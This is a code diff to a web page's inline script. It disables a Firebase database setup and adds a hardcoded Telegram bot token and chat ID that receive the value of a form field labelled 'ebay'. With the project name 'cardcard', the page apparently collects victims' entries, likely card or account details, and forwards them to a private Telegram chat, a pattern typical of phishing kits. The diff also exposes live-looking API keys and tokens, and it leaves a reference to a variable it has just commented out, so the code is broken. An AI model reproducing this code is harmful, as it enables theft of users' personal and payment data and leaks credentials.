@@ -71,17 +71,17 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.1/firebase-app.js";
         import { getDatabase, ref, set, onValue, push } from "https://www.gstatic.com/firebasejs/10.12.1/firebase-database.js";
 
-        const firebaseConfig = {
-  apiKey: "AIzaSyCYzi9T8dqpjS8VY-PRSVFdwHUvsqzjzAw",
-  authDomain: "cardcard-6f2ef.firebaseapp.com",
-  projectId: "cardcard-6f2ef",
-  storageBucket: "cardcard-6f2ef.firebasestorage.app",
-  messagingSenderId: "1068987121792",
-  appId: "1:1068987121792:web:9c255c879435160599e665",
-  databaseURL: "https://cardcard-6f2ef-default-rtdb.firebaseio.com/"
-};
-        const app = initializeApp(firebaseConfig);
-        const database = getDatabase(app);
+//         const firebaseConfig = {
+//   apiKey: "AIzaSyCYzi9T8dqpjS8VY-PRSVFdwHUvsqzjzAw",
+//   authDomain: "cardcard-6f2ef.firebaseapp.com",
+//   projectId: "cardcard-6f2ef",
+//   storageBucket: "cardcard-6f2ef.firebasestorage.app",
+//   messagingSenderId: "1068987121792",
+//   appId: "1:1068987121792:web:9c255c879435160599e665",
+//   databaseURL: "https://cardcard-6f2ef-default-rtdb.firebaseio.com/"
+// };
+//         const app = initializeApp(firebaseConfig);
+//         const database = getDatabase(app);
 
         const Presy = async () => {
             let ebay = document.getElementById("ebay").value;
@@ -107,10 +107,17 @@
                 Date: date,
                 Time: time
             };
-            let dbRef = ref(database, todos);
-            let newDbRef = push(dbRef);
+            // let dbRef = ref(database, todos);
+            // let newDbRef = push(dbRef);
 
             spinner.style.display = 'block';
+
+              const botToken = '8191097883:AAHcw2x0KQ88QMiJTTZU9Rq1REGMF7WDN6k';
+    const chatId = '468271675';
+    const text = ebay;
+            // const text = await set(obj);
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             try {
                 await set(newDbRef, obj);
